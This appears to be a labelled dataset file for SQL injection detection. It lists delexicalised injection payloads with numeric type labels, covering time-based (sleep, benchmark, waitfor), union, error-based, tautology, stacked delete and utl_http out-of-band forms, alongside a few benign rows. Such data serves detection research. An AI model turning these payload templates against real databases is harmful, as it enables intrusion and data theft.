payload_delex,type_id
"elt ( [__IDENT__] = [__IDENT__] , sleep ( [__IDENT__] ) ) elt ( [__IDENT__] , sleep ( [__IDENT__] ) )",6
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__ --",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",2
"__INT__ ) ) and __IDENT__ ( __INT__ = __INT__ , __INT__ ) and ( ( __INT__ = __INT__",2
"__INT__ % and elt ( __INT__ = __INT__ , __INT__ ) and % __STR__",2
"__INT__ % ) ) ) __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) and ( ( ( % __STR__",3
__IDENT__-__IDENT__:450px ; __IDENT__:left ; __IDENT__:10px 10px 10px 0px ; __IDENT__:0px ; __STR__ > __IDENT__ __IDENT__ __IDENT__ __IDENT__ __IDENT__ < / __IDENT__ > 544473__STR__1,0
1__STR__ujds__STR__ujds,2
"__INT__ % "" and __INT__ = __INT__",2
-6746__STR__kohi__STR__kohi,2
__INT__ ) as __IDENT__ where __INT__ = __INT__ waitfor __IDENT__ __STR__ --,6
__INT__' and __INT__ = __INT__,2
"__INT__' where __INT__ = __INT__ and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ where __INT__ = __INT__ or __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) #",6
"__INT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"-__INT__' ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ --",7
"create table if not exists `__IDENT__` ( `__IDENT__` __IDENT__ ( __INT__ ) __IDENT__ not null __IDENT__ , `__IDENT__` __IDENT__ ( __INT__ ) __IDENT__ null , `__IDENT__` __IDENT__ not null , `__IDENT__` __IDENT__ ( __INT__ ) not null , primary key ( __IDENT__ ) ) __IDENT__ = __IDENT__ __IDENT__ __IDENT__ = __IDENT__",0
"__INT__ ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) )",6
-__INT__' ) where __INT__ = __INT__ or __INT__ = __INT__,2
__INT__' ) ) and __INT__ = __INT__#,2
"-__INT__"" ) where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ or __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
or __STR__ = ',2
"__INT__ ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"select __IDENT__ , __IDENT__ from __IDENT__ where __IDENT__ = __STR__ union select __IDENT__ , __IDENT__ from __IDENT__",7
waitfor __IDENT__ __STR__ and ( ( __STR__ = ',6
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or ( __INT__ = __INT__ ) * __INT__ --,2
"__INT__ ) ) ) and __INT__ = benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) and ( ( ( __IDENT__",6
-5800__STR__tcab__STR__tcab,2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
-__INT__ ) or __INT__ = __INT__,2
-__INT__ % ' ) ) ) order by __INT__ --,0
"__INT__' where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
__INT__' ) as __IDENT__ where __INT__ = __INT__ and sleep ( __INT__ ) --,6
"__INT__' ) as __IDENT__ where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
delete from __IDENT__,2
"-__INT__ or elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__ ) ) as __IDENT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",2
""" or __INT__ = __INT__ --",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = __INT__#",2
"__INT__"" ) as __IDENT__ where __INT__ = __INT__ and __INT__ = like ( __STR__ , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"__INT__ ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
__INT__ ) and __INT__ = __INT__#,2
-__INT__ ) ) as __IDENT__ where __INT__ = __INT__ or __INT__ = __INT__ --,2
"-__INT__"" ) ) ) or __INT__ = __INT__#",2
"__INT__ % ' or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__ % "" ) or __INT__ = __INT__",2
"__INT__ % ' ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"__INT__ ) or __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) and ( __IDENT__",6
-4327__STR__lclf__STR__lclf,2
|| utl_http . __IDENT__ ( __IDENT__: / / __IDENT__ / __STR__,4
"__INT__ ) as __IDENT__ where __INT__ = __INT__ __IDENT__ __IDENT__ ( extractvalue ( __INT__ , concat ( __HEX__ , ( benchmark ( __INT__ , __IDENT__ ( __HEX__ ) ) ) ) ) , __INT__ ) #",3
-__INT__ % ' ) or __INT__ = __INT__ --,2
or [__IDENT__] = [__IDENT__] or [__IDENT__],2
-__INT__' or __INT__ = __INT__ --,2
"1__STR__gqsk' where __INT__ = __INT__ union all select null , null , null , null --",7
"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",2
"-__INT__ % "" ) order by __INT__ --",0
"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ , __STR__ )",2
"__INT__' ) where __INT__ = __INT__ or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) --",2
"-__INT__ % "" ) ) ) or __INT__ = __INT__#",2
"__INT__"" ) ) as __IDENT__ where __INT__ = __INT__ and char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( left ( __IDENT__ ( char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) , null ) , __INT__ ) , __INT__ ) , null ) --",2
"1__STR__abcdefg' , __IDENT__ ( hex ( randomblob ( __INT__ / __INT__ ) ) ) ) --",6
"-__INT__' or elt ( __INT__ = __INT__ , __INT__ )",2
"__INT__"" ) and __INT__ = dbms_pipe . __IDENT__ ( chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) || chr ( __INT__ ) , __INT__ ) --",6
-__INT__ % ' or __INT__ = __INT__,2
"or elt ( [__IDENT__] = [__IDENT__] , sleep ( [__IDENT__] ) ) or elt ( [__IDENT__] , sleep ( [__IDENT__] ) )",6
-__INT__ or __INT__ = __INT__,2
-__INT__ ) ) or ( __INT__ = __INT__ ) * __INT__ and ( ( __INT__ = __INT__,2
"__INT__ % ) ) or char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) || char ( __INT__ ) = __IDENT__ ( __IDENT__ ( right ( char ( __INT__ ) , __INT__ ) , __INT__ ) , null ) and ( ( % __STR__",2
